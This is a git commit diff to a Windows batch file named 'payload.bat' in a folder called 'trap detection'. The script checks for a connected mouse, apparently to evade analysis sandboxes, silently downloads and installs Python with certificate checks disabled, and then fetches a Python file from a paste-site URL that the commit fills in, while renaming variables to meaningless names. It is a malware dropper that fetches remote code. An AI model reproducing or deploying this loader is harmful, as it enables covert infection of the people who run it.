372523120fe11c57beedbf2c5953b535c81d4f64
TheCuteOwl <114611129+TheCuteOwl@users.noreply.github.com>
2024-01-24 13:26:13 +0100

    Update payload.bat

--- trap detection/payload.bat
+++ trap detection/payload.bat
@@ -11,14 +11,14 @@ if not !mouseConnected! == true (
     exit /b 1
 )
 
-set "PYTHON_URL=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
-set "PYTHON_INSTALLER=python-installer.exe"
+set "eee=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
+set "eeee=python-installer.exe"
 
-curl -L -o !PYTHON_INSTALLER! !PYTHON_URL! --insecure --silent
-start /wait !PYTHON_INSTALLER! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
-del !PYTHON_INSTALLER!
+curl -L -o !eeee! !eee! --insecure --silent
+start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
+del !eeee!
 
-set "ENCODED_URL="
+set "ENCODED_URL=https://rentry.co/3454o/raw"
 
 set "OUTPUT_FILE=webpage.py"
 curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure
